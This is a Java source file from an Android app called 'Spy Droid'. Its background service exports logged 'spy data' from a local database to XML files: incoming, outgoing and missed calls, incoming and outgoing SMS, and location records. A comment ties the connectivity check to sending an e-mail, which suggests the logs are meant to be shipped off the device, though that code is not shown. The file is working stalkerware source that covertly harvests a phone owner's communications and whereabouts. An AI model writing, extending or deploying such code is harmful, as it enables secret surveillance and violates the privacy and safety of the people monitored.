package com.innolabs.spydroid;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

/**
 * Write DataBase to XML is a class which acts as a Service in the Application and helps in writing the spy data from the database to an XML file.
 * 
 * @author Srikanth Rao
 * 
 * @see android.app.Service
 *
 */
public class WriteDataBasetoXML extends Service{

	/** Static variable of type DataBase to access the database */
	private static DataBase dataBase;

	/** Private variable of type XmlBuilder to build an XML from a String list with data from the database */
	private XmlBuilder xmlBuilder;

	/** Static string value of the folder which will be created in the application directory to store the XML files */
	static String DATASUBDIRECTORY = "LOGS";
	
	/** String value to show the TAG for the activity in the LOG CAT */
	public static String WRITEDATATOXML_TAG = "SPY DROID - WRITE DATABASE TO XML SERVICE";

	/**
	 * Method that starts as soon as the Calls Listener service is started.
	 * 
	 * This method is used to write the log files from the database into an XML document
	 * 
	 * @see android.app.Service#onStartCommand(Intent, int, int)
	 * 
	 * @return The Intent, Flags and startId which was sent as arguments
	 */
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		// Checking for Internet Connection
		if(InternetConnectionAvailable())
		{

			// Opening and getting Read Access to the Database
			dataBase = new DataBase(this, "SPY_DROID");
			dataBase.getReadableDatabase();

			// Trying to export Database files to XML
			try {
				
				Log.v(WRITEDATATOXML_TAG, "Starting Exports");
				
				export("SPY_DROID", "IncomingCalls", "INCOMING_CALLS");
				export("SPY_DROID", "OutgoingCalls", "OUTGOING_CALLS");
				export("SPY_DROID", "MissedCalls", "MISSED_CALLS");
				export("SPY_DROID", "IncomingSMS", "INCOMING_SMS");
				export("SPY_DROID", "OutgoingSMS", "OUTGOING_SMS");
				export("SPY_DROID", "Locations", "LOCATIONS");

			} catch (IOException e) {

				e.printStackTrace();
			}

			// Closing Database
			dataBase.close();

		}

		return super.onStartCommand(intent, flags, startId);
	}

	/**
	 * Export is a method to send the Database, Exporting file name and the table to be exported to the XML builder class which in turn saves the data to an XML document
	 * 
	 * @param dbName String value of Database name from which the data is accessed
	 * @param exportFileNamePrefix String value for the file name with which the exported file will be named and stored
	 * @param tableName Table name of the database from which the data must be retrieved to write it in an XML file
	 * @throws IOException Exception which may occur due to run time error while pulling or saving the files from the Android System
	 */
	public void export(final String dbName, final String exportFileNamePrefix, final String tableName) throws IOException {


		// Initializing XmlBuilder
		try {

			xmlBuilder = new XmlBuilder();

		} catch (IOException e) {

			e.printStackTrace();
		}
		// Starting XmlBuilder Service for the Database
		xmlBuilder.start(dbName);

		Log.v(WRITEDATATOXML_TAG, "XML Builder started for "+dbName);

		// Getting values from the table using DataBase Cursor
		Cursor c = dataBase.getValues(tableName);

		Log.v(WRITEDATATOXML_TAG, "Getting values for cursor from "+tableName+" Table : "+c);

		// Moving the cursor to first position
		if (c.moveToFirst()) {

			// Checking an Skipping the Generic database table names
			if (!tableName.equals("android_metadata") && !tableName.equals("sqlite_sequence")
					&& !tableName.startsWith("uidx")) {
				try {

					// Exporting the table
					exportTable(tableName);

					Log.v(WRITEDATATOXML_TAG, "Exporting Table Name : "+tableName);

				} catch (IOException e) {

					e.printStackTrace();
				}
			}

		}

		// Creating String value xmlString and initializing to NULL
		String xmlString = null;

		// Ending XML Builder String
		try {

			xmlString = xmlBuilder.end();

		} catch (IOException e) {

			e.printStackTrace();
		}

		try {

			// Writing the string file to an XML file
			writeToFile(xmlString, exportFileNamePrefix + ".xml");

			Log.v(WRITEDATATOXML_TAG, "Writing to file");

		} catch (IOException e) {

			e.printStackTrace();
		}

		c.close();

	}

	/**
	 * Export table is a sub-method in Export main method through which the table elements are exported to a String
	 * @param tableName Table name of the database from which the data is extracted
	 * @throws IOException Input Output Exception i.e run time error if the File is not found or not accessible
	 */
	private void exportTable(final String tableName) throws IOException {

		// Opening table
		xmlBuilder.openTable(tableName);

		Log.v(WRITEDATATOXML_TAG, "Table Opened : "+tableName);

		// Getting values from Cursor
		Cursor c = dataBase.getValues(tableName);

		Log.v(WRITEDATATOXML_TAG, "Values inside "+tableName+" Table : "+c);

		// Moving the Cursor to first position
		if (c.moveToFirst()) {

			// Getting column count
			int cols = c.getColumnCount();

			Log.v(WRITEDATATOXML_TAG, "No of columns found : "+cols);

			// Opening row and getting the string value data
			do {

				xmlBuilder.openRow();

				Log.v(WRITEDATATOXML_TAG, "Opening ROW");

				for (int i = 0; i < cols; i++) {

					xmlBuilder.addColumn(c.getColumnName(i), c.getString(i));

					Log.v(WRITEDATATOXML_TAG, "Adding column to xmlBuilder : "+c.getColumnName(i)+" : "+c.getString(i));
				}

				// Closing row
				xmlBuilder.closeRow();

				Log.v(WRITEDATATOXML_TAG, "Closing ROW");

			} while (c.moveToNext()); // Moving to next Cursor value
		}

		// Closing the Cursor
		c.close();

		// Closing the Table
		xmlBuilder.closeTable();

		Log.v(WRITEDATATOXML_TAG, "Table Closed");
	}

	/**
	 * Write to File is a sub-method in Export method through which the exported database file is stored in an XML file
	 * @param xmlString String value which has the single row string from the database table
	 * @param exportFileName File name for the exported XML file
	 * @throws IOException Input Output Exception that may occur during accessing the Files i.e either writing into a file or storing the file
	 */
	private void writeToFile(final String xmlString, final String exportFileName) throws IOException {

		// Creating Directory file
		File dir = new File(Environment.getDataDirectory()+"/data/com.innolabs.spydroid/", WriteDataBasetoXML.DATASUBDIRECTORY);
		
		if (!dir.exists()) {

			Log.v(WRITEDATATOXML_TAG,"Creating Directory if not exists");
			
			// Creating Directory if not exists
			dir.mkdirs();
		}

		// Declaring a new file with file directory and file name
		File file = new File(dir, exportFileName);

		// Creating the file
		file.createNewFile();

		Log.v(WRITEDATATOXML_TAG, "Creating new file in "+dir+" directory with name "+exportFileName);

		// Getting data using Buffers
		ByteBuffer buff = ByteBuffer.wrap(xmlString.getBytes());

		// Creating channels for the Output Stream
		FileChannel channel = new FileOutputStream(file).getChannel();

		try {

			// Writing the buffer data to the channel
			channel.write(buff);

			Log.v(WRITEDATATOXML_TAG, "Writing to buffer : "+buff);

		} finally {

			if (channel != null) {

				// Closing the Channel
				channel.close();
			}
		}
	}


	/**
	 * Method to check for Internet Connectivity to send the e-mail
	 * 
	 * @return Boolean value whether Internet connection is available or not
	 */
	private boolean InternetConnectionAvailable() {

		ConnectivityManager checkConnectivity = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
		NetworkInfo connectivity = checkConnectivity.getActiveNetworkInfo();

		if(connectivity == null)
		{

			Log.v(WRITEDATATOXML_TAG, "No Network Available");

			return false;
		}

		Log.v(WRITEDATATOXML_TAG, "Internet Connection is Avaliable");

		return connectivity.isConnectedOrConnecting();
	}


	/** Method called when BindService is called from other instance
	 * 
	 * @param intent The Intent from which the method was called
	 * 
	 * @return null Noting is sent back to the bindService method
	 * 
	 * @see android.app.Service#onBind(Intent)
	 */
	@Override
	public IBinder onBind(Intent intent) {

		return null;
	}



}
